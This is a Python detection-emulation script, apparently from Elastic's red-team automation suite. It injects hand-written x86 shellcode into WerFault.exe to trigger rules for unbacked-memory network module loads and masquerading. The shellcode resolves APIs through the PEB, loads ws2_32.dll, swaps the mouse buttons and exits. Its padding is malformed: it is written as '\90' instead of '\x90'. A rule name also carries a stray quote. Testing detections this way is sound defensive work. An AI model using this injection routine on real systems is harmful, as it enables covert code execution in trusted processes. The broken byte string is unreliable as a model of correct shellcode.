# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


# shellcode to load ws2_32.dll from unbacked memory to trigger <Network Module Loaded from Suspicious Unbacked Memory>
SHELLCODE = b"\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\x68\x77\x73\x32\x5F\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24\x04\x33\xC9\x51\xB9\x74\x6F\x6E\x61\x51\x83\x6C\x24\x03\x61\x68\x65\x42\x75\x74\x68\x4D\x6F\x75\x73\x68\x53\x77\x61\x70\x54\x50\xFF\xD2\x83\xC4\x14\x33\xC9\x41\x51\xFF\xD0\x83\xC4\x04\x5A\x5B\xB9\x65\x73\x73\x61\x51\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\x33\xC9\x51\xFF\xD0\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90"


metadata = RtaMetadata(
    uuid="727aa289-a1ff-4c82-b688-4cc99e07269f",
    platforms=["windows"],
    endpoint=[
        {'rule_id': 'aa265fbd-4c57-46ff-9e89-0635101cc50d',
         'rule_name': 'Network Module Loaded from Suspicious Unbacked Memory"'},
        {'rule_id': 'ace0bb76-290f-4f5f-a21f-c3b13ee415a9',
         'rule_name': 'Potential Masquerading as Windows Error Manager'},
    ],
    siem=[],
    techniques=["T1055", "T1036"],
)


@common.requires_os(*metadata.platforms)

def main():
    # Inject shellcode into WerFault.exe to trigger <Potential Masquerading as Windows Error Manager>
    common.Inject(u"C:\\Windows\\SysWOw64\\WerFault.exe", SHELLCODE)
    #time.sleep(2)
    common.execute(["taskkill", "/f", "/im", "WerFault.exe"])


if __name__ == "__main__":
    exit(main())
